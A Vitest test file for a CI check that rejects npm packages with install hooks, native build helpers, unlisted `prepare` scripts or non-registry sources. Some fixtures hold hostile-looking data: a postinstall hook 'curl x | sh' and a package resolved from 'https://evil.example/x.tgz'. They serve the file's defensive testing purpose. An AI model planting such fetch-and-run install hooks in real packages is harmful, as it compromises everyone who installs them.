// ci-no-scripts.test.ts — scripts/ci/check-no-scripts.mjs must FAIL on an install hook, a native build
// or an unlisted `prepare` anywhere in the runtime tree, accept the keyring's prebuilt platform
// package only as a bare `.node`, and tolerate the platform packages npm skipped (plan 04 §4.1
// `supply-chain`; plan 02 §7). Ported from sibling @d72e03b, adapted.
import { afterEach, describe, expect, it } from "vitest";
import {
  PLATFORM_PACKAGE,
  PREPARE_ALLOWED,
  inspectPackage,
  inspectPlatformPackage,
  lockfileInstallScripts,
} from "../../scripts/ci/check-no-scripts.mjs";
import { fakeProject, runCheck, tempDir, writeTree } from "../lint/helpers.js";

const REG = "https://registry.npmjs.org/x/-/x-1.0.0.tgz";

describe("inspectPackage", () => {
  const base = { id: "x@1.0.0", dir: "/nonexistent-eff-dir" };
  it.each(["preinstall", "install", "postinstall"])("fails on a %s script", (hook) => {
    const r = inspectPackage({
      ...base,
      manifest: { scripts: { [hook]: "node evil.js" } },
      resolved: REG,
    });
    expect(r.errors.join()).toContain(hook);
  });

  it("fails on `prepare` for a registry package that is not on PREPARE_ALLOWED", () => {
    const r = inspectPackage({ ...base, manifest: { scripts: { prepare: "tsc" } }, resolved: REG });
    expect(r.errors.join()).toContain("not on PREPARE_ALLOWED");
  });

  it("allows `prepare` (as a warning) only for the exact listed name@version from the registry", () => {
    expect(Object.keys(PREPARE_ALLOWED)).toEqual(["hyparquet@1.31.2"]);
    const ok = inspectPackage({
      id: "hyparquet@1.31.2",
      dir: base.dir,
      manifest: { scripts: { prepare: "x" } },
      resolved: REG,
    });
    expect(ok.errors).toEqual([]);
    expect(ok.warnings.join()).toContain("prepare");
    const otherVersion = inspectPackage({
      id: "hyparquet@1.31.3",
      dir: base.dir,
      manifest: { scripts: { prepare: "x" } },
      resolved: REG,
    });
    expect(otherVersion.errors).toHaveLength(1);
  });

  it.each([
    undefined,
    "git+ssh://git@github.com/x/x.git#abc",
    "file:../x",
    "https://evil.example/x.tgz",
  ])("fails on a listed `prepare` when resolved from %s", (resolved) => {
    const r = inspectPackage({
      id: "hyparquet@1.31.2",
      dir: base.dir,
      manifest: { scripts: { prepare: "tsc" } },
      resolved,
    });
    expect(r.errors.join()).toContain("not installed from the npm registry");
  });

  it("fails on gypfile: true", () => {
    expect(inspectPackage({ ...base, manifest: { gypfile: true } }).errors).toHaveLength(1);
  });

  it.each(["prebuild-install", "node-gyp-build", "@mapbox/node-pre-gyp", "napi-postinstall"])(
    "fails on a dependency on %s",
    (helper) => {
      const r = inspectPackage({
        ...base,
        manifest: { optionalDependencies: { [helper]: "1.0.0" } },
      });
      expect(r.errors.join()).toContain(helper);
    },
  );

  it("fails on a non-object manifest", () => {
    expect(inspectPackage({ ...base, manifest: "nope" }).errors).toHaveLength(1);
    expect(inspectPackage({ ...base, manifest: null }).errors).toHaveLength(1);
  });

  it("ignores harmless scripts (test, build, prestart)", () => {
    const r = inspectPackage({
      ...base,
      manifest: { scripts: { test: "x", build: "y", prestart: "z" } },
    });
    expect(r).toEqual({ errors: [], warnings: [] });
  });
});

describe("the keyring's prebuilt platform packages", () => {
  it("PLATFORM_PACKAGE matches the twelve names and nothing else", () => {
    for (const n of [
      "@napi-rs/keyring-darwin-arm64",
      "@napi-rs/keyring-darwin-x64",
      "@napi-rs/keyring-linux-x64-gnu",
      "@napi-rs/keyring-linux-x64-musl",
      "@napi-rs/keyring-win32-ia32-msvc",
      "@napi-rs/keyring-freebsd-x64",
    ])
      expect(PLATFORM_PACKAGE.test(n), n).toBe(true);
    for (const n of [
      "@napi-rs/keyring",
      "@napi-rs/keyring-evil/x",
      "@evil/keyring-darwin-x64",
      "keyring-darwin-x64",
    ])
      expect(PLATFORM_PACKAGE.test(n), n).toBe(false);
  });

  let tmp: ReturnType<typeof tempDir> | undefined;
  afterEach(() => tmp?.cleanup());
  const platform = (manifest: Record<string, unknown>, files: Record<string, string> = {}) => {
    tmp = tempDir();
    writeTree(tmp.dir, {
      "package.json": { name: "@napi-rs/keyring-darwin-x64", ...manifest },
      ...files,
    });
    return inspectPlatformPackage(
      "p@2.1.0",
      tmp.dir,
      { name: "@napi-rs/keyring-darwin-x64", ...manifest },
      true,
    );
  };
  const good = { main: "k.node", files: ["k.node"] };

  it("accepts a bare prebuilt .node", () => {
    expect(platform(good, { "k.node": "\u0000bin", "README.md": "x" })).toEqual([]);
  });

  it.each([
    ["any script", { ...good, scripts: { test: "x" } }, "scripts"],
    ["a dependency", { ...good, dependencies: { a: "1" } }, "dependencies"],
    ["a non-.node main", { main: "index.js", files: ["index.js"] }, ".node"],
    ["a nested main", { main: "../k.node", files: ["../k.node"] }, ".node"],
    ["extra files listed", { ...good, files: ["k.node", "install.js"] }, "files"],
  ])("refuses %s", (_why, manifest, needle) => {
    expect(platform(manifest, { "k.node": "x" }).join()).toContain(needle);
  });

  it("refuses a missing binary and an unexpected shipped file", () => {
    expect(platform(good).join()).toContain("missing");
    expect(platform(good, { "k.node": "x", "postinstall.js": "x" }).join()).toContain(
      "unexpected files",
    );
  });

  it("refuses a platform package not resolved from the registry", () => {
    tmp = tempDir();
    writeTree(tmp.dir, { "k.node": "x" });
    expect(inspectPlatformPackage("p@2.1.0", tmp.dir, { ...good }, false).join()).toContain(
      "registry",
    );
  });
});

describe("lockfileInstallScripts", () => {
  it("reports runtime entries with hasInstallScript, ignores dev ones", () => {
    const lock = {
      packages: {
        "": { name: "root" },
        "node_modules/a": { hasInstallScript: true },
        "node_modules/b": { hasInstallScript: true, dev: true },
        "node_modules/c": { hasInstallScript: true, devOptional: true },
        "node_modules/d": {},
        "node_modules/e": { hasInstallScript: true, optional: true },
      },
    };
    expect(lockfileInstallScripts(lock)).toEqual(["node_modules/a", "node_modules/e"]);
  });
  it.each([null, 1, "x", {}, { packages: [] }])("tolerates a malformed lockfile: %j", (lock) => {
    expect(lockfileInstallScripts(lock)).toEqual([]);
  });
});

describe("check-no-scripts CLI on a fake project", () => {
  let tmp: ReturnType<typeof tempDir> | undefined;
  afterEach(() => tmp?.cleanup());

  it("exits 1 and names the package with a postinstall (nested one level down)", () => {
    tmp = tempDir();
    fakeProject(tmp.dir, { good: { dependencies: { evil: "1.0.0" } } });
    writeTree(tmp.dir, {
      "node_modules/evil/package.json": {
        name: "evil",
        version: "1.0.0",
        scripts: { postinstall: "curl x | sh" },
      },
    });
    const r = runCheck("check-no-scripts.mjs", ["--root", tmp.dir]);
    expect(r.status).toBe(1);
    expect(r.stderr).toContain('evil@1.0.0: has a "postinstall" script');
  });

  it("exits 1 on a shipped binding.gyp", () => {
    tmp = tempDir();
    fakeProject(tmp.dir, { native: {} }, { "node_modules/native/binding.gyp": "{}" });
    const r = runCheck("check-no-scripts.mjs", ["--root", tmp.dir]);
    expect(r.status).toBe(1);
    expect(r.stderr).toContain("binding.gyp");
  });

  it("exits 1 when a declared dependency is missing from node_modules", () => {
    tmp = tempDir();
    writeTree(tmp.dir, {
      "package.json": { name: "p", version: "1.0.0", dependencies: { ghost: "1.0.0" } },
    });
    const r = runCheck("check-no-scripts.mjs", ["--root", tmp.dir]);
    expect(r.status).toBe(1);
    expect(r.stderr).toMatch(/missing/i);
  });

  it("exits 0 on a clean tree", () => {
    tmp = tempDir();
    fakeProject(tmp.dir, { clean: { scripts: { test: "vitest" } } });
    const r = runCheck("check-no-scripts.mjs", ["--root", tmp.dir]);
    expect(r.stderr).toBe("");
    expect(r.status).toBe(0);
  });

  it("exits 0 on this repository's real runtime tree (one prebuilt platform package)", () => {
    const r = runCheck("check-no-scripts.mjs", []);
    expect(r.status, r.stderr).toBe(0);
    expect(r.stdout).toContain("1 prebuilt platform package(s)");
  });
});
